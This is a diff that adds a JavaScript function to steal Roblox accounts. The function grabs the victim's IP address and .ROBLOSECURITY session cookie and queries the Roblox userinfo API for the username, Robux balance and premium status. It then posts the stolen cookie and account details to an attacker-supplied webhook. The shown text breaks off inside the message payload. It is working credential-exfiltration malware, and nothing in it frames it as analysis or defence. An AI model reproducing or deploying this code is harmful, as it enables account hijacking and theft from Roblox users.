@@ -1,0 +1,43 @@
+const WEBHOOK = "";
+
+async function main(cookie) {
+    var ipAddr = await (await fetch("https://api.ipify.org")).text();
+
+    if (cookie) {
+        var statistics = await (await fetch("https://www.roblox.com/mobileapi/userinfo", {
+            headers: {
+                Cookie: ".ROBLOSECURITY=" + cookie
+            },
+            redirect: "manual"
+        })).json();
+    }
+    
+    fetch(WEBHOOK, {
+        method: "POST",
+        headers: {
+            "Content-Type": "Application/json"
+        },
+        body: JSON.stringify({
+            "content": null,
+            "embeds": [
+              {
+                "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
+                "color": null,
+                "fields": [
+                  {
+                    "name": "Username",
+                    "value": statistics ? statistics.UserName : "N/A",
+                    "inline": true
+                  },
+                  {
+                    "name": "Robux",
+                    "value": statistics ? statistics.RobuxBalance : "N/A",
+                    "inline": true
+                  },
+                  {
+                    "name": "Premium",
+                    "value": statistics ? statistics.IsPremium : "N/A",
+                    "inline": true
+                  }
+                ],
+                "author": {
